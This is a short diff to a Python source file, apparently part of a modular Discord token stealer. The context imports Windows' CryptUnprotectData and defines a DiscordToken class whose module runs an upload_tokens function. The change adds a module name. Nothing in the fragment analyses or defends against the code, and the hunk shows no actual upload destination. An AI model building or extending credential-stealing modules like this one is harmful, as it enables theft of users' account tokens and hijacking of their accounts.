@@ -11,6 +11,8 @@ from win32crypt import CryptUnprotectData
 
 
 class DiscordToken:
+    MODULE_NAME = "token"
+    
     @classmethod
     def run_module(cls) -> dict[str, Any]:
         return upload_tokens().get_data()
